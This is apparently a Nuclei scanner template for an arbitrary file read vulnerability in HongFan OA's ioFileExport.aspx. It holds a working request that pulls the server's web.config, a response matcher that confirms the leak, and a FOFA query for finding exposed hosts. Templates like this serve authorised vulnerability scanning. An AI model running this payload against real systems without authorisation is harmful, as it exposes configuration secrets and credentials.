content:
id: HongFan-OA-ioFileExport-FileRead

info:
  name: HongFan OA  FileRead
  author: cr
  severity: high
  description: HongFan-OA-FileRead
  tags: HongFan,FileRead

requests:
  - method: GET
    path:
      - '{{BaseURL}}/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "socketPool"
        part: body

      - type: status
        status:
          - 200
#fofa-query:app="红帆-ioffice"
help: 红帆OA ioFileExport.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感信息
author: cr
